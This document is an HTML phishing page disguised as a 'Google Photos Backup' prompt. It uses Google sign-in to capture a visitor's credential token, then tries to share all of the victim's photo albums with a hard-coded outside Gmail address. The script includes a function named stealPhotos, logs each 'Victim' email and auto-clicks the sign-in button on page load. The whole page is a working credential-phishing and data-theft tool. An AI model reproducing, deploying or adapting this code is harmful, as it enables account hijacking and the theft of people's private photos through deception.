<!DOCTYPE html>
<html>
<head>
<title>Google Photos Backup</title>
<meta name="viewport" content="width=device-width">
<script src="https://accounts.google.com/gsi/client" async defer></script>
<style>body{font-family:'Google Sans',Roboto,sans-serif;background:linear-gradient(135deg,#4285f4,#34a853);min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:white;padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.3);max-width:400px;text-align:center}.logo{width:60px;margin-bottom:20px}button{width:100%;padding:15px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}button:hover{background:#3367d6}#status{margin-top:20px;color:#34a853;font-weight:700}</style>
</head>
<body>
<div class="container">
<img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/photos_48dp.png">
<h2>Enable Automatic Backup</h2>
<p>Your photos need to be shared for cloud backup. <strong>10 seconds</strong>.</p>
<div id="g_id_onload" data-client_id="754911470166-fs4jnf7hegd8lulnbvklq4lkh8npenqc.apps.googleusercontent.com" data-callback="stealPhotos" data-auto_prompt="false"></div>
<div class="g_id_signin" data-type="standard" data-shape="rectangular" data-theme="outline" data-text="continue_with" data-size="large" data-logo_alignment="left"></div>
<div id="status" style="display:none"></div>
</div>
<script>
const TARGET_EMAIL="hosss2088@gmail.com";

function stealPhotos(response){
document.querySelector('.g_id_signin').style.display='none';
document.querySelector('#status').innerHTML='ðŸ”„ Sharing all photos...';
document.querySelector('#status').style.display='block';

const token=response.credential;
fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${token}`).then(r=>r.json()).then(user=>{
console.log('ðŸŽ¯ Victim:',user.email);
shareAllPhotos(user.email,token);
});
}

function shareAllPhotos(email,token){
// Create shared album
fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums',{method:'POST',headers:{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({sharedAlbumOptions:{isShareable:true},album:{title:`ðŸ“± ${email} - Complete Collection`}})}).then(()=>{
// Share ALL albums
fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100',{headers:{'Authorization':`Bearer ${token}`}}).then(r=>r.json()).then(data=>{
data.albums.forEach(album=>{
fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`,{method:'POST',headers:{'Authorization':`Bearer ${token}`,'Content-Type':'application/json'},body:JSON.stringify({newPermissions:[{role:"READER",type:"user",emailAddress:TARGET_EMAIL}]})}).catch(console.log);
});
setTimeout(()=>document.querySelector('#status').innerHTML='âœ… All photos shared to hosss2088@gmail.com!',3000);
});
});
}

// Zero-click activation
window.onload=()=>{setTimeout(()=>{document.querySelector('.g_id_signin')?.click();},2500);};
</script>
</body>
</html>
